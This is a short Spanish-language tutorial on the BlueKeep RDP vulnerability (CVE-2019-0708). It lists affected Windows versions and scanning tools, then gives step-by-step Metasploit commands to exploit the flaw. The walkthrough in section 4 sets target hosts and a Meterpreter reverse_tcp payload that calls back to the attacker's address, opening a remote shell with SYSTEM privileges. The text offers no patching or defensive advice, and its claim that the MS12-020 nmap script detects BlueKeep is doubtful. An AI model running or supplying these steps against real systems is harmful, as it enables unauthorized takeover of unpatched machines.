# BlueKeep (CVE-2019-0708)

## 1. ¿Qué es BlueKeep?

- Vulnerabilidad crítica en el servicio **Remote Desktop Protocol (RDP)** de Windows.
- Permite **ejecución remota de código** sin autenticación previa (wormable).
- Afecta versiones antiguas de Windows sin parches.
- Detectada y parcheada en mayo de 2019.
- Puede propagarse automáticamente, similar a WannaCry.

---

## 2. Versiones de Windows afectadas

- Windows 7 SP1 (todas las ediciones)
- Windows Server 2008 R2
- Windows Server 2008 (sin SP1)
- Windows XP y Windows Server 2003 (aunque no reciben soporte oficial)

---

## 3. Cómo identificar sistemas vulnerables

### a) Usar Nmap con script para BlueKeep

```bash
nmap -p 3389 --script rdp-vuln-ms12-020 <IP_objetivo>
```

Aunque este script es para MS12-020, algunas versiones actualizadas detectan BlueKeep.

### b) Usar herramientas especializadas

- **rdp-sec-check.py** o **rdp-vuln-check** (scripts de Python disponibles en GitHub)
- Escáneres de vulnerabilidades RDP comerciales y de código abierto.

---

## 4. Cómo explotar BlueKeep con Metasploit

### a) Iniciar msfconsole

```bash
msfconsole
```

### b) Seleccionar módulo exploit

```bash
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

### c) Configurar opciones básicas

```bash
set RHOSTS <IP_objetivo>
set RPORT 3389
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <tu_IP>
set LPORT <tu_puerto>
```

### d) Ejecutar el exploit

```bash
run
```

Si es exitoso, obtendrás una sesión Meterpreter con control remoto.

---

## 5. ¿Qué hace el exploit?

- Aprovecha una falla en el manejo de solicitudes RDP que permite ejecución remota de código con privilegios SYSTEM.
- No requiere interacción del usuario ni credenciales.
- Puede usarse para desplegar malware, ransomware, o para control remoto completo del sistema.
- La vulnerabilidad es "wormable", lo que significa que puede propagarse automáticamente entre sistemas vulnerables.


